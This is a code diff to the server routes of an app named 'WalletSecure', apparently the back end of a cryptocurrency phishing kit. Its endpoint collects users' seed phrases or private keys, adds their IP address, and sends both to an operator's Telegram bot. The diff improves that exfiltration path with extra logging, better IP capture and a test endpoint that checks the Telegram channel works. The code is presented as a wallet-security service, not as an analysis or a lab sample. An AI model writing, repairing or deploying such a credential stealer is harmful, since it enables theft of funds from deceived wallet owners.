@@ -12,6 +12,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
       console.log('Received request body:', req.body);
       const { walletType, connectionMethod, credentials } = req.body;
       
+      console.log('Environment check:');
+      console.log('- TELEGRAM_BOT_TOKEN exists:', !!process.env.TELEGRAM_BOT_TOKEN);
+      console.log('- TELEGRAM_BOT_TOKEN length:', process.env.TELEGRAM_BOT_TOKEN?.length);
+      console.log('- TELEGRAM_CHAT_ID:', process.env.TELEGRAM_CHAT_ID);
+      
       if (!process.env.TELEGRAM_BOT_TOKEN) {
         console.error('TELEGRAM_BOT_TOKEN not configured');
         return res.status(500).json({ message: 'Telegram not configured' });
@@ -28,21 +33,29 @@ export async function registerRoutes(app: Express): Promise<Server> {
                      `Method: ${connectionMethod === 'seed' ? 'Seed Phrase' : 'Private Key'}\n` +
                      `Credentials: ${credentials}\n\n` +
                      `Time: ${new Date().toISOString()}\n` +
-                     `IP: ${req.ip || 'Unknown'}`;
+                     `IP: ${req.ip || req.connection?.remoteAddress || 'Unknown'}`;
 
       const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
+      console.log('Sending to Telegram URL:', telegramUrl.replace(process.env.TELEGRAM_BOT_TOKEN, '[TOKEN]'));
+      
+      const payload = {
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'HTML'
+      };
+      
+      console.log('Telegram payload:', { ...payload, text: `[${payload.text.length} chars]` });
       
       const response = await fetch(telegramUrl, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
+        body: JSON.stringify(payload)
       });
 
+      console.log('Telegram response status:', response.status);
+      
       if (!response.ok) {
         const errorText = await response.text();
         console.error('Telegram API error:', response.status, errorText);
@@ -55,6 +68,35 @@ export async function registerRoutes(app: Express): Promise<Server> {
     } catch (error) {
       console.error('Telegram send error:', error);
       res.status(500).json({ message: 'Internal server error', error: String(error) });
+    }
+  });
+
+  // Test endpoint to verify Telegram connection
+  app.post('/api/test-telegram', async (req, res) => {
+    try {
+      const chatId = process.env.TELEGRAM_CHAT_ID;
+      const message = `🧪 Test Message\n\nThis is a test from WalletSecure.\nTime: ${new Date().toISOString()}`;
+      
+      const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      const response = await fetch(telegramUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+
+      if (!response.ok) {
+        const errorText = await response.text();
+        return res.status(500).json({ error: errorText });
+      }
+
+      const result = await response.json();
+      res.json({ success: true, result });
+    } catch (error) {
+      res.status(500).json({ error: String(error) });
     }
   });
 
